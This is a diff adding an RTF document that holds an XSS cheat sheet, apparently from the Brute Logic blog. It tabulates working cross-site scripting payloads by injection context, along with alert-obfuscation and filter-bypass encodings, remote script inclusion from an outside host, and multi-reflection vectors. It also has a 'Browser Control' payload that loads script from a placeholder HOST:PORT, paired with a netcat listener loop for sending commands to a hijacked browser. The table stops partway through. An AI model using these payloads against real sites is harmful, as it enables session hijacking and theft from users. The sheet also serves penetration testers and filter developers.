@@ -1,0 +1,585 @@
+{\rtf1\ansi\ansicpg1252\cocoartf1404\cocoasubrtf470
+{\fonttbl\f0\fswiss\fcharset0 Helvetica;}
+{\colortbl;\red255\green255\blue255;\red52\green52\blue52;\red209\green233\blue245;\red213\green213\blue213;
+\red247\green247\blue247;\red20\green111\blue205;}
+\paperw11900\paperh16840\margl1440\margr1440\vieww23520\viewh12500\viewkind0
+\deftab720
+
+\itap1\trowd \taflags1 \trgaph108\trleft-108 \trbrdrt\brdrnil \trbrdrl\brdrnil \trbrdrr\brdrnil 
+\clvertalc \clcbpat3 \clwWidth2638\clftsWidth3 \clbrdrt\brdrnil \clbrdrl\brdrnil \clbrdrb\brdrs\brdrw20\brdrcf4 \clbrdrr\brdrnil \clpadt160 \clpadl160 \clpadb160 \clpadr160 \gaph\cellx4320
+\clvertalc \clcbpat3 \clwWidth12905\clftsWidth3 \clbrdrt\brdrnil \clbrdrl\brdrnil \clbrdrb\brdrs\brdrw20\brdrcf4 \clbrdrr\brdrnil \clpadt160 \clpadl160 \clpadb160 \clpadr160 \gaph\cellx8640
+\pard\intbl\itap1\pardeftab720\partightenfactor0
+
+\f0\b\fs32 \cf2 \expnd0\expndtw0\kerning0
+Technique\cell 
+\pard\intbl\itap1\pardeftab720\partightenfactor0
+\cf2 Vector/Payload *\cell \row
+
+\itap1\trowd \taflags1 \trgaph108\trleft-108 \trbrdrl\brdrnil \trbrdrr\brdrnil 
+\clvertalt \clcbpat1 \clwWidth2638\clftsWidth3 \clbrdrt\brdrnil \clbrdrl\brdrnil \clbrdrb\brdrnil \clbrdrr\brdrnil \clpadt160 \clpadl160 \clpadb160 \clpadr160 \gaph\cellx4320
+\clvertalt \clcbpat1 \clwWidth12905\clftsWidth3 \clbrdrt\brdrnil \clbrdrl\brdrnil \clbrdrb\brdrnil \clbrdrr\brdrnil \clpadt160 \clpadl160 \clpadb160 \clpadr160 \gaph\cellx8640
+\pard\intbl\itap1\pardeftab720\partightenfactor0
+
+\b0 \cf2 HTML Context \
+Tag Injection\cell 
+\pard\intbl\itap1\pardeftab720\partightenfactor0
+\cf2 \
+<svg onload=alert(1)>\
+"><svg onload=alert(1)//\cell \row
+
+\itap1\trowd \taflags1 \trgaph108\trleft-108 \trbrdrl\brdrnil \trbrdrr\brdrnil 
+\clvertalt \clcbpat5 \clwWidth2638\clftsWidth3 \clbrdrt\brdrs\brdrw20\brdrcf4 \clbrdrl\brdrnil \clbrdrb\brdrnil \clbrdrr\brdrnil \clpadt160 \clpadl160 \clpadb160 \clpadr160 \gaph\cellx4320
+\clvertalt \clcbpat5 \clwWidth12905\clftsWidth3 \clbrdrt\brdrs\brdrw20\brdrcf4 \clbrdrl\brdrnil \clbrdrb\brdrnil \clbrdrr\brdrnil \clpadt160 \clpadl160 \clpadb160 \clpadr160 \gaph\cellx8640
+\pard\intbl\itap1\pardeftab720\partightenfactor0
+\cf2 HTML Context \
+Inline Injection\cell 
+\pard\intbl\itap1\pardeftab720\partightenfactor0
+\cf2 \
+"onmouseover=alert(1)//\
+"autofocus/onfocus=alert(1)//\cell \row
+
+\itap1\trowd \taflags1 \trgaph108\trleft-108 \trbrdrl\brdrnil \trbrdrr\brdrnil 
+\clvertalt \clcbpat1 \clwWidth2638\clftsWidth3 \clbrdrt\brdrs\brdrw20\brdrcf4 \clbrdrl\brdrnil \clbrdrb\brdrnil \clbrdrr\brdrnil \clpadt160 \clpadl160 \clpadb160 \clpadr160 \gaph\cellx4320
+\clvertalt \clcbpat1 \clwWidth12905\clftsWidth3 \clbrdrt\brdrs\brdrw20\brdrcf4 \clbrdrl\brdrnil \clbrdrb\brdrnil \clbrdrr\brdrnil \clpadt160 \clpadl160 \clpadb160 \clpadr160 \gaph\cellx8640
+\pard\intbl\itap1\pardeftab720\partightenfactor0
+\cf2 Javascript Context \
+Code Injection\cell 
+\pard\intbl\itap1\pardeftab720\partightenfactor0
+\cf2 \
+'-alert(1)-'\
+'-alert(1)//\cell \row
+
+\itap1\trowd \taflags1 \trgaph108\trleft-108 \trbrdrl\brdrnil \trbrdrr\brdrnil 
+\clvertalt \clcbpat5 \clwWidth2638\clftsWidth3 \clbrdrt\brdrs\brdrw20\brdrcf4 \clbrdrl\brdrnil \clbrdrb\brdrnil \clbrdrr\brdrnil \clpadt160 \clpadl160 \clpadb160 \clpadr160 \gaph\cellx4320
+\clvertalt \clcbpat5 \clwWidth12905\clftsWidth3 \clbrdrt\brdrs\brdrw20\brdrcf4 \clbrdrl\brdrnil \clbrdrb\brdrnil \clbrdrr\brdrnil \clpadt160 \clpadl160 \clpadb160 \clpadr160 \gaph\cellx8640
+\pard\intbl\itap1\pardeftab720\partightenfactor0
+\cf2 Javascript Context \
+Code Injection\
+(escaping the escape)\cell 
+\pard\intbl\itap1\pardeftab720\partightenfactor0
+\cf2 \
+\
+\\'-alert(1)//\cell \row
+
+\itap1\trowd \taflags1 \trgaph108\trleft-108 \trbrdrl\brdrnil \trbrdrr\brdrnil 
+\clvertalt \clcbpat1 \clwWidth2638\clftsWidth3 \clbrdrt\brdrs\brdrw20\brdrcf4 \clbrdrl\brdrnil \clbrdrb\brdrnil \clbrdrr\brdrnil \clpadt160 \clpadl160 \clpadb160 \clpadr160 \gaph\cellx4320
+\clvertalt \clcbpat1 \clwWidth12905\clftsWidth3 \clbrdrt\brdrs\brdrw20\brdrcf4 \clbrdrl\brdrnil \clbrdrb\brdrnil \clbrdrr\brdrnil \clpadt160 \clpadl160 \clpadb160 \clpadr160 \gaph\cellx8640
+\pard\intbl\itap1\pardeftab720\partightenfactor0
+\cf2 Javascript Context \
+Tag Injection\cell 
+\pard\intbl\itap1\pardeftab720\partightenfactor0
+\cf2 \
+</script><svg onload=alert(1)>\cell \row
+
+\itap1\trowd \taflags1 \trgaph108\trleft-108 \trbrdrl\brdrnil \trbrdrr\brdrnil 
+\clvertalt \clcbpat5 \clwWidth2638\clftsWidth3 \clbrdrt\brdrs\brdrw20\brdrcf4 \clbrdrl\brdrnil \clbrdrb\brdrnil \clbrdrr\brdrnil \clpadt160 \clpadl160 \clpadb160 \clpadr160 \gaph\cellx4320
+\clvertalt \clcbpat5 \clwWidth12905\clftsWidth3 \clbrdrt\brdrs\brdrw20\brdrcf4 \clbrdrl\brdrnil \clbrdrb\brdrnil \clbrdrr\brdrnil \clpadt160 \clpadl160 \clpadb160 \clpadr160 \gaph\cellx8640
+\pard\intbl\itap1\pardeftab720\partightenfactor0
+\cf2 PHP_SELF Injection\cell 
+\pard\intbl\itap1\pardeftab720\partightenfactor0
+\cf2 http://DOMAIN/PAGE.php/"><svg onload=alert(1)>\cell \row
+
+\itap1\trowd \taflags1 \trgaph108\trleft-108 \trbrdrl\brdrnil \trbrdrr\brdrnil 
+\clvertalt \clcbpat1 \clwWidth2638\clftsWidth3 \clbrdrt\brdrs\brdrw20\brdrcf4 \clbrdrl\brdrnil \clbrdrb\brdrnil \clbrdrr\brdrnil \clpadt160 \clpadl160 \clpadb160 \clpadr160 \gaph\cellx4320
+\clvertalt \clcbpat1 \clwWidth12905\clftsWidth3 \clbrdrt\brdrs\brdrw20\brdrcf4 \clbrdrl\brdrnil \clbrdrb\brdrnil \clbrdrr\brdrnil \clpadt160 \clpadl160 \clpadb160 \clpadr160 \gaph\cellx8640
+\pard\intbl\itap1\pardeftab720\partightenfactor0
+\cf2 Without Parenthesis\cell 
+\pard\intbl\itap1\pardeftab720\partightenfactor0
+\cf2 <svg onload=alert`1`>\
+<svg onload=alert&lpar;1&rpar;>\
+<svg onload=alert&#x28;1&#x29>\
+<svg onload=alert&#40;1&#41>\cell \row
+
+\itap1\trowd \taflags1 \trgaph108\trleft-108 \trbrdrl\brdrnil \trbrdrr\brdrnil 
+\clvertalt \clcbpat5 \clwWidth2638\clftsWidth3 \clbrdrt\brdrs\brdrw20\brdrcf4 \clbrdrl\brdrnil \clbrdrb\brdrnil \clbrdrr\brdrnil \clpadt160 \clpadl160 \clpadb160 \clpadr160 \gaph\cellx4320
+\clvertalt \clcbpat5 \clwWidth12905\clftsWidth3 \clbrdrt\brdrs\brdrw20\brdrcf4 \clbrdrl\brdrnil \clbrdrb\brdrnil \clbrdrr\brdrnil \clpadt160 \clpadl160 \clpadb160 \clpadr160 \gaph\cellx8640
+\pard\intbl\itap1\pardeftab720\partightenfactor0
+\cf2 \
+\
+Filter Bypass \
+Alert Obfuscation\cell 
+\pard\intbl\itap1\pardeftab720\partightenfactor0
+\cf2 (alert)(1)\
+a=alert,a(1)\
+[1].find(alert)\
+top["al"+"ert"](1)\
+top[/al/.source+/ert/.source](1)\
+al\\u0065rt(1)\
+top['al\\145rt'](1)\
+top['al\\x65rt'](1)\
+top[8680439..toString(30)](1)\cell \row
+
+\itap1\trowd \taflags1 \trgaph108\trleft-108 \trbrdrl\brdrnil \trbrdrr\brdrnil 
+\clvertalt \clcbpat1 \clwWidth2638\clftsWidth3 \clbrdrt\brdrs\brdrw20\brdrcf4 \clbrdrl\brdrnil \clbrdrb\brdrnil \clbrdrr\brdrnil \clpadt160 \clpadl160 \clpadb160 \clpadr160 \gaph\cellx4320
+\clvertalt \clcbpat1 \clwWidth12905\clftsWidth3 \clbrdrt\brdrs\brdrw20\brdrcf4 \clbrdrl\brdrnil \clbrdrb\brdrnil \clbrdrr\brdrnil \clpadt160 \clpadl160 \clpadb160 \clpadr160 \gaph\cellx8640
+\pard\intbl\itap1\pardeftab720\partightenfactor0
+\cf2 \
+\
+\
+\
+Body Tag\cell 
+\pard\intbl\itap1\pardeftab720\partightenfactor0
+\cf2 <body onload=alert(1)>\
+<body onpageshow=alert(1)>\
+<body onfocus=alert(1)>\
+<body onhashchange=alert(1)><a href=#x>click this!#x\
+<body style=overflow:auto;height:1000px onscroll=alert(1) id=x>#x\
+<body onscroll=alert(1)><br><br><br><br>\
+<br><br><br><br><br><br><br><br><br><br>\
+<br><br><br><br><br><br><br><br><br><br>\
+<br><br><br><br><br><br><x id=x>#x\
+<body onresize=alert(1)>press F12!\
+<body onhelp=alert(1)>press F1! (MSIE)\cell \row
+
+\itap1\trowd \taflags1 \trgaph108\trleft-108 \trbrdrl\brdrnil \trbrdrr\brdrnil 
+\clvertalt \clcbpat5 \clwWidth2638\clftsWidth3 \clbrdrt\brdrs\brdrw20\brdrcf4 \clbrdrl\brdrnil \clbrdrb\brdrnil \clbrdrr\brdrnil \clpadt160 \clpadl160 \clpadb160 \clpadr160 \gaph\cellx4320
+\clvertalt \clcbpat5 \clwWidth12905\clftsWidth3 \clbrdrt\brdrs\brdrw20\brdrcf4 \clbrdrl\brdrnil \clbrdrb\brdrnil \clbrdrr\brdrnil \clpadt160 \clpadl160 \clpadb160 \clpadr160 \gaph\cellx8640
+\pard\intbl\itap1\pardeftab720\partightenfactor0
+\cf2 \
+\
+\
+Miscellaneous Vectors\cell 
+\pard\intbl\itap1\pardeftab720\partightenfactor0
+\cf2 <marquee onstart=alert(1)>\
+<marquee loop=1 width=0 onfinish=alert(1)>\
+<audio src onloadstart=alert(1)>\
+<video onloadstart=alert(1)><source>\
+<input autofocus onblur=alert(1)>\
+<keygen autofocus onfocus=alert(1)>\
+<form onsubmit=alert(1)><input type=submit>\
+<select onchange=alert(1)><option>1<option>2\
+<menu id=x contextmenu=x onshow=alert(1)>right click me!\cell \row
+
+\itap1\trowd \taflags1 \trgaph108\trleft-108 \trbrdrl\brdrnil \trbrdrr\brdrnil 
+\clvertalt \clcbpat1 \clwWidth2638\clftsWidth3 \clbrdrt\brdrs\brdrw20\brdrcf4 \clbrdrl\brdrnil \clbrdrb\brdrnil \clbrdrr\brdrnil \clpadt160 \clpadl160 \clpadb160 \clpadr160 \gaph\cellx4320
+\clvertalt \clcbpat1 \clwWidth12905\clftsWidth3 \clbrdrt\brdrs\brdrw20\brdrcf4 \clbrdrl\brdrnil \clbrdrb\brdrnil \clbrdrr\brdrnil \clpadt160 \clpadl160 \clpadb160 \clpadr160 \gaph\cellx8640
+\pard\intbl\itap1\pardeftab720\partightenfactor0
+\cf2 \
+\
+\
+\
+\pard\intbl\itap1\pardeftab720\partightenfactor0
+{\field{\*\fldinst{HYPERLINK "http://brutelogic.com.br/blog/agnostic-event-handlers"}}{\fldrslt \cf6 \
+Agnostic Event Handlers}}\cell 
+\pard\intbl\itap1\pardeftab720\partightenfactor0
+\cf2 <x contenteditable onblur=alert(1)>lose focus! \
+<x onclick=alert(1)>click this! \
+<x oncopy=alert(1)>copy this! \
+<x oncontextmenu=alert(1)>right click this! \
+<x oncut=alert(1)>copy this! \
+<x ondblclick=alert(1)>double click this! \
+<x ondrag=alert(1)>drag this! \
+<x contenteditable onfocus=alert(1)>focus this! \
+<x contenteditable oninput=alert(1)>input here! \
+<x contenteditable onkeydown=alert(1)>press any key! \
+<x contenteditable onkeypress=alert(1)>press any key! \
+<x contenteditable onkeyup=alert(1)>press any key! \
+<x onmousedown=alert(1)>click this! \
+<x onmousemove=alert(1)>hover this! \
+<x onmouseout=alert(1)>hover this! \
+<x onmouseover=alert(1)>hover this! \
+<x onmouseup=alert(1)>click this! \
+<x contenteditable onpaste=alert(1)>paste here!\cell \row
+
+\itap1\trowd \taflags1 \trgaph108\trleft-108 \trbrdrl\brdrnil \trbrdrr\brdrnil 
+\clvertalt \clcbpat5 \clwWidth2638\clftsWidth3 \clbrdrt\brdrs\brdrw20\brdrcf4 \clbrdrl\brdrnil \clbrdrb\brdrnil \clbrdrr\brdrnil \clpadt160 \clpadl160 \clpadb160 \clpadr160 \gaph\cellx4320
+\clvertalt \clcbpat5 \clwWidth12905\clftsWidth3 \clbrdrt\brdrs\brdrw20\brdrcf4 \clbrdrl\brdrnil \clbrdrb\brdrnil \clbrdrr\brdrnil \clpadt160 \clpadl160 \clpadb160 \clpadr160 \gaph\cellx8640
+\pard\intbl\itap1\pardeftab720\partightenfactor0
+{\field{\*\fldinst{HYPERLINK "http://brutelogic.com.br/blog/existing-code-reuse"}}{\fldrslt \cf6 Code Reuse\
+Inline Script}}\cell 
+\pard\intbl\itap1\pardeftab720\partightenfactor0
+\cf2 <script>alert(1)// \
+<script>alert(1)<!\'96\cell \row
+
+\itap1\trowd \taflags1 \trgaph108\trleft-108 \trbrdrl\brdrnil \trbrdrr\brdrnil 
+\clvertalt \clcbpat1 \clwWidth2638\clftsWidth3 \clbrdrt\brdrs\brdrw20\brdrcf4 \clbrdrl\brdrnil \clbrdrb\brdrnil \clbrdrr\brdrnil \clpadt160 \clpadl160 \clpadb160 \clpadr160 \gaph\cellx4320
+\clvertalt \clcbpat1 \clwWidth12905\clftsWidth3 \clbrdrt\brdrs\brdrw20\brdrcf4 \clbrdrl\brdrnil \clbrdrb\brdrnil \clbrdrr\brdrnil \clpadt160 \clpadl160 \clpadb160 \clpadr160 \gaph\cellx8640
+\pard\intbl\itap1\pardeftab720\partightenfactor0
+{\field{\*\fldinst{HYPERLINK "http://brutelogic.com.br/blog/existing-code-reuse"}}{\fldrslt \cf6 Code Reuse \
+Regular Script}}\cell 
+\pard\intbl\itap1\pardeftab720\partightenfactor0
+\cf2 <script src=//brutelogic.com.br/1.js> \
+<script src=//3334957647/1>\cell \row
+
+\itap1\trowd \taflags1 \trgaph108\trleft-108 \trbrdrl\brdrnil \trbrdrr\brdrnil 
+\clvertalt \clcbpat5 \clwWidth2638\clftsWidth3 \clbrdrt\brdrs\brdrw20\brdrcf4 \clbrdrl\brdrnil \clbrdrb\brdrnil \clbrdrr\brdrnil \clpadt160 \clpadl160 \clpadb160 \clpadr160 \gaph\cellx4320
+\clvertalt \clcbpat5 \clwWidth12905\clftsWidth3 \clbrdrt\brdrs\brdrw20\brdrcf4 \clbrdrl\brdrnil \clbrdrb\brdrnil \clbrdrr\brdrnil \clpadt160 \clpadl160 \clpadb160 \clpadr160 \gaph\cellx8640
+\pard\intbl\itap1\pardeftab720\partightenfactor0
+\cf2 \
+\
+\
+\
+\pard\intbl\itap1\pardeftab720\partightenfactor0
+{\field{\*\fldinst{HYPERLINK "http://brutelogic.com.br/blog/filter-bypass-procedure"}}{\fldrslt \cf6 Filter Bypass\
+Generic Tag + Handler}}\cell 
+
+\itap2\trowd \taflags1 \trgaph108\trleft-108 \trbrdrt\brdrnil \trbrdrl\brdrnil \trbrdrr\brdrnil 
+\clvertalt \clcbpat5 \clwWidth3308\clftsWidth3 \clbrdrt\brdrnil \clbrdrl\brdrnil \clbrdrb\brdrnil \clbrdrr\brdrnil \clpadt160 \clpadl160 \clpadb160 \clpadr160 \gaph\cellx2880
+\clvertalt \clcbpat5 \clwWidth5205\clftsWidth3 \clbrdrt\brdrnil \clbrdrl\brdrnil \clbrdrb\brdrnil \clbrdrr\brdrnil \clpadt160 \clpadl160 \clpadb160 \clpadr160 \gaph\cellx5760
+\clvertalt \clcbpat5 \clwWidth4072\clftsWidth3 \clbrdrt\brdrnil \clbrdrl\brdrnil \clbrdrb\brdrnil \clbrdrr\brdrnil \clpadt160 \clpadl160 \clpadb160 \clpadr160 \gaph\cellx8640
+\pard\intbl\itap2\pardeftab720\partightenfactor0
+\cf2 Encoding \nestcell 
+\pard\intbl\itap2\pardeftab720\partightenfactor0
+\cf2 Mixed Case \nestcell 
+\pard\intbl\itap2\pardeftab720\partightenfactor0
+\cf2 Spacers \nestcell \nestrow
+
+\itap2\trowd \taflags1 \trgaph108\trleft-108 \trbrdrl\brdrnil \trbrdrr\brdrnil 
+\clvertalt \clcbpat5 \clwWidth3308\clftsWidth3 \clbrdrt\brdrs\brdrw20\brdrcf4 \clbrdrl\brdrnil \clbrdrb\brdrnil \clbrdrr\brdrnil \clpadt160 \clpadl160 \clpadb160 \clpadr160 \gaph\cellx2880
+\clvertalt \clcbpat5 \clwWidth5205\clftsWidth3 \clbrdrt\brdrs\brdrw20\brdrcf4 \clbrdrl\brdrnil \clbrdrb\brdrnil \clbrdrr\brdrnil \clpadt160 \clpadl160 \clpadb160 \clpadr160 \gaph\cellx5760
+\clvertalt \clcbpat5 \clwWidth4072\clftsWidth3 \clbrdrt\brdrs\brdrw20\brdrcf4 \clbrdrl\brdrnil \clbrdrb\brdrnil \clbrdrr\brdrnil \clpadt160 \clpadl160 \clpadb160 \clpadr160 \gaph\cellx8640
+\pard\intbl\itap2\pardeftab720\partightenfactor0
+\cf2 %3Cx onxxx=1 \
+<%78 onxxx=1 \
+<x %6Fnxxx=1 \
+<x o%6Exxx=1 \
+<x on%78xx=1 \
+<x onxxx%3D1\nestcell 
+\pard\intbl\itap2\pardeftab720\partightenfactor0
+\cf2 <X onxxx=1 \
+<x OnXxx=1 \
+<X OnXxx=1 \
+\
+Doubling \
+<x onxxx=1 onxxx=1\
+\nestcell 
+\pard\intbl\itap2\pardeftab720\partightenfactor0
+\cf2 <x/onxxx=1 \
+<x%09onxxx=1 \
+<x%0Aonxxx=1 \
+<x%0Conxxx=1 \
+<x%0Donxxx=1 \
+<x%2Fonxxx=1 \nestcell \nestrow
+
+\itap2\trowd \taflags1 \trgaph108\trleft-108 \trbrdrl\brdrnil \trbrdrr\brdrnil 
+\clvertalt \clcbpat5 \clwWidth3308\clftsWidth3 \clbrdrt\brdrs\brdrw20\brdrcf4 \clbrdrl\brdrnil \clbrdrb\brdrnil \clbrdrr\brdrnil \clpadt160 \clpadl160 \clpadb160 \clpadr160 \gaph\cellx2880
+\clvertalt \clcbpat5 \clwWidth5205\clftsWidth3 \clbrdrt\brdrs\brdrw20\brdrcf4 \clbrdrl\brdrnil \clbrdrb\brdrnil \clbrdrr\brdrnil \clpadt160 \clpadl160 \clpadb160 \clpadr160 \gaph\cellx5760
+\clvertalt \clcbpat5 \clwWidth4072\clftsWidth3 \clbrdrt\brdrs\brdrw20\brdrcf4 \clbrdrl\brdrnil \clbrdrb\brdrnil \clbrdrr\brdrnil \clpadt160 \clpadl160 \clpadb160 \clpadr160 \gaph\cellx8640
+\pard\intbl\itap2\pardeftab720\partightenfactor0
+\cf2 Quotes\nestcell 
+\pard\intbl\itap2\pardeftab720\partightenfactor0
+\cf2 Stripping\nestcell 
+\pard\intbl\itap2\pardeftab720\partightenfactor0
+\cf2 Mimetism\nestcell \nestrow
+
+\itap2\trowd \taflags1 \trgaph108\trleft-108 \trbrdrl\brdrnil \trbrdrt\brdrnil \trbrdrr\brdrnil 
+\clvertalt \clcbpat5 \clwWidth3308\clftsWidth3 \clbrdrt\brdrs\brdrw20\brdrcf4 \clbrdrl\brdrnil \clbrdrb\brdrnil \clbrdrr\brdrnil \clpadt160 \clpadl160 \clpadb160 \clpadr160 \gaph\cellx2880
+\clvertalt \clcbpat5 \clwWidth5205\clftsWidth3 \clbrdrt\brdrs\brdrw20\brdrcf4 \clbrdrl\brdrnil \clbrdrb\brdrnil \clbrdrr\brdrnil \clpadt160 \clpadl160 \clpadb160 \clpadr160 \gaph\cellx5760
+\clvertalt \clcbpat5 \clwWidth4072\clftsWidth3 \clbrdrt\brdrs\brdrw20\brdrcf4 \clbrdrl\brdrnil \clbrdrb\brdrnil \clbrdrr\brdrnil \clpadt160 \clpadl160 \clpadb160 \clpadr160 \gaph\cellx8640
+\pard\intbl\itap2\pardeftab720\partightenfactor0
+\cf2 <x 1='1'onxxx=1 \
+<x 1="1"onxxx=1\nestcell 
+\pard\intbl\itap2\pardeftab720\partightenfactor0
+\cf2 <[S]x onx[S]xx=1\
+\
+[S] = stripped char or string\nestcell 
+\pard\intbl\itap2\pardeftab720\partightenfactor0
+\cf2 <x </onxxx=1 \
+<x 1=">" onxxx=1 \
+<http://onxxx%3D1/\nestcell \lastrow\nestrow\cell \row
+
+\itap1\trowd \taflags1 \trgaph108\trleft-108 \trbrdrl\brdrnil \trbrdrr\brdrnil 
+\clvertalt \clcbpat1 \clwWidth2638\clftsWidth3 \clbrdrt\brdrs\brdrw20\brdrcf4 \clbrdrl\brdrnil \clbrdrb\brdrnil \clbrdrr\brdrnil \clpadt160 \clpadl160 \clpadb160 \clpadr160 \gaph\cellx4320
+\clvertalt \clcbpat1 \clwWidth12905\clftsWidth3 \clbrdrt\brdrs\brdrw20\brdrcf4 \clbrdrl\brdrnil \clbrdrb\brdrnil \clbrdrr\brdrnil \clpadt160 \clpadl160 \clpadb160 \clpadr160 \gaph\cellx8640
+\pard\intbl\itap1\pardeftab720\partightenfactor0
+{\field{\*\fldinst{HYPERLINK "http://brutelogic.com.br/blog/source-breaking-injections"}}{\fldrslt \cf6 Generic Source Breaking}}\cell 
+\pard\intbl\itap1\pardeftab720\partightenfactor0
+\cf2 \
+<x onxxx=alert(1) 1='\cell \row
+
+\itap1\trowd \taflags1 \trgaph108\trleft-108 \trbrdrl\brdrnil \trbrdrr\brdrnil 
+\clvertalt \clcbpat5 \clwWidth2638\clftsWidth3 \clbrdrt\brdrs\brdrw20\brdrcf4 \clbrdrl\brdrnil \clbrdrb\brdrnil \clbrdrr\brdrnil \clpadt160 \clpadl160 \clpadb160 \clpadr160 \gaph\cellx4320
+\clvertalt \clcbpat5 \clwWidth12905\clftsWidth3 \clbrdrt\brdrs\brdrw20\brdrcf4 \clbrdrl\brdrnil \clbrdrb\brdrnil \clbrdrr\brdrnil \clpadt160 \clpadl160 \clpadb160 \clpadr160 \gaph\cellx8640
+\pard\intbl\itap1\pardeftab720\partightenfactor0
+{\field{\*\fldinst{HYPERLINK "http://brutelogic.com.br/blog/using-xss-to-control-a-browser"}}{\fldrslt \cf6 Browser Control}}\cell 
+\pard\intbl\itap1\pardeftab720\partightenfactor0
+\cf2 <svg onload=setInterval(function()\{with(document)body. \
+appendChild(createElement('script')).src='//HOST:PORT'\},0)> \
+\
+$ while :; do printf "j$ "; read c; echo $c | nc -lp PORT >/dev/null; done\cell \row
+
+\itap1\trowd \taflags1 \trgaph108\trleft-108 \trbrdrl\brdrnil \trbrdrr\brdrnil 
+\clvertalt \clcbpat1 \clwWidth2638\clftsWidth3 \clbrdrt\brdrs\brdrw20\brdrcf4 \clbrdrl\brdrnil \clbrdrb\brdrnil \clbrdrr\brdrnil \clpadt160 \clpadl160 \clpadb160 \clpadr160 \gaph\cellx4320
+\clvertalt \clcbpat1 \clwWidth12905\clftsWidth3 \clbrdrt\brdrs\brdrw20\brdrcf4 \clbrdrl\brdrnil \clbrdrb\brdrnil \clbrdrr\brdrnil \clpadt160 \clpadl160 \clpadb160 \clpadr160 \gaph\cellx8640
+\pard\intbl\itap1\pardeftab720\partightenfactor0
+\cf2 \
+\
+\
+\
+\
+\
+\pard\intbl\itap1\pardeftab720\partightenfactor0
+{\field{\*\fldinst{HYPERLINK "http://brutelogic.com.br/blog/multi-reflection-xss"}}{\fldrslt \cf6 Multi Reflection}}\cell 
+
+\itap2\trowd \taflags1 \trgaph108\trleft-108 \trbrdrt\brdrnil \trbrdrl\brdrnil \trbrdrr\brdrnil 
+\clmgf \clvertalt \clcbpat1 \clwWidth12586\clftsWidth3 \clbrdrt\brdrnil \clbrdrl\brdrnil \clbrdrb\brdrnil \clbrdrr\brdrnil \clpadt160 \clpadl160 \clpadb160 \clpadr160 \gaph\cellx4320
+\clmrg \clvertalt \clcbpat1 \clwWidth12586\clftsWidth3 \clbrdrt\brdrnil \clbrdrl\brdrnil \clbrdrb\brdrnil \clbrdrr\brdrnil \clpadt160 \clpadl160 \clpadb160 \clpadr160 \gaph\cellx8640
+\pard\intbl\itap2\pardeftab720\partightenfactor0
+\cf2 Double Reflection\nestcell 
+\pard\intbl\itap2\nestcell \nestrow
+
+\itap2\trowd \taflags1 \trgaph108\trleft-108 \trbrdrl\brdrnil \trbrdrr\brdrnil 
+\clvertalt \clcbpat1 \clwWidth5638\clftsWidth3 \clbrdrt\brdrs\brdrw20\brdrcf4 \clbrdrl\brdrnil \clbrdrb\brdrnil \clbrdrr\brdrnil \clpadt160 \clpadl160 \clpadb160 \clpadr160 \gaph\cellx4320
+\clvertalt \clcbpat1 \clwWidth6947\clftsWidth3 \clbrdrt\brdrs\brdrw20\brdrcf4 \clbrdrl\brdrnil \clbrdrb\brdrnil \clbrdrr\brdrnil \clpadt160 \clpadl160 \clpadb160 \clpadr160 \gaph\cellx8640
+\pard\intbl\itap2\pardeftab720\partightenfactor0
+\cf2 Single Input\nestcell 
+\pard\intbl\itap2\pardeftab720\partightenfactor0
+\cf2 Single Input (script-based)\nestcell \nestrow
+
+\itap2\trowd \taflags1 \trgaph108\trleft-108 \trbrdrl\brdrnil \trbrdrr\brdrnil 
+\clvertalt \clcbpat1 \clwWidth5638\clftsWidth3 \clbrdrt\brdrs\brdrw20\brdrcf4 \clbrdrl\brdrnil \clbrdrb\brdrnil \clbrdrr\brdrnil \clpadt160 \clpadl160 \clpadb160 \clpadr160 \gaph\cellx4320
+\clvertalt \clcbpat1 \clwWidth6947\clftsWidth3 \clbrdrt\brdrs\brdrw20\brdrcf4 \clbrdrl\brdrnil \clbrdrb\brdrnil \clbrdrr\brdrnil \clpadt160 \clpadl160 \clpadb160 \clpadr160 \gaph\cellx8640
+\pard\intbl\itap2\pardeftab720\partightenfactor0
+\cf2 'onload=alert(1)><svg/1='\nestcell 
+\pard\intbl\itap2\pardeftab720\partightenfactor0
+\cf2 '>alert(1)</script><script/1=' \
+*/alert(1)</script><script>/*\nestcell \nestrow
+
+\itap2\trowd \taflags1 \trgaph108\trleft-108 \trbrdrl\brdrnil \trbrdrr\brdrnil 
+\clmgf \clvertalt \clcbpat1 \clwWidth12586\clftsWidth3 \clbrdrt\brdrs\brdrw20\brdrcf4 \clbrdrl\brdrnil \clbrdrb\brdrnil \clbrdrr\brdrnil \clpadt160 \clpadl160 \clpadb160 \clpadr160 \gaph\cellx4320
+\clmrg \clvertalt \clcbpat1 \clwWidth12586\clftsWidth3 \clbrdrt\brdrs\brdrw20\brdrcf4 \clbrdrl\brdrnil \clbrdrb\brdrnil \clbrdrr\brdrnil \clpadt160 \clpadl160 \clpadb160 \clpadr160 \gaph\cellx8640
+\pard\intbl\itap2\pardeftab720\partightenfactor0
+\cf2 Triple Reflection\nestcell 
+\pard\intbl\itap2\nestcell \nestrow
+
+\itap2\trowd \taflags1 \trgaph108\trleft-108 \trbrdrl\brdrnil \trbrdrr\brdrnil 
+\clvertalt \clcbpat1 \clwWidth5638\clftsWidth3 \clbrdrt\brdrs\brdrw20\brdrcf4 \clbrdrl\brdrnil \clbrdrb\brdrnil \clbrdrr\brdrnil \clpadt160 \clpadl160 \clpadb160 \clpadr160 \gaph\cellx4320
+\clvertalt \clcbpat1 \clwWidth6947\clftsWidth3 \clbrdrt\brdrs\brdrw20\brdrcf4 \clbrdrl\brdrnil \clbrdrb\brdrnil \clbrdrr\brdrnil \clpadt160 \clpadl160 \clpadb160 \clpadr160 \gaph\cellx8640
+\pard\intbl\itap2\pardeftab720\partightenfactor0
+\cf2 Single Input\nestcell 
+\pard\intbl\itap2\pardeftab720\partightenfactor0
+\cf2 Single Input (script-based)\nestcell \nestrow
+
+\itap2\trowd \taflags1 \trgaph108\trleft-108 \trbrdrl\brdrnil \trbrdrr\brdrnil 
+\clvertalt \clcbpat1 \clwWidth5638\clftsWidth3 \clbrdrt\brdrs\brdrw20\brdrcf4 \clbrdrl\brdrnil \clbrdrb\brdrnil \clbrdrr\brdrnil \clpadt160 \clpadl160 \clpadb160 \clpadr160 \gaph\cellx4320
+\clvertalt \clcbpat1 \clwWidth6947\clftsWidth3 \clbrdrt\brdrs\brdrw20\brdrcf4 \clbrdrl\brdrnil \clbrdrb\brdrnil \clbrdrr\brdrnil \clpadt160 \clpadl160 \clpadb160 \clpadr160 \gaph\cellx8640
+\pard\intbl\itap2\pardeftab720\partightenfactor0
+\cf2 */alert(1)">'onload="/*<svg/1=' \
+`-alert(1)">'onload="`<svg/1='\nestcell 
+\pard\intbl\itap2\pardeftab720\partightenfactor0
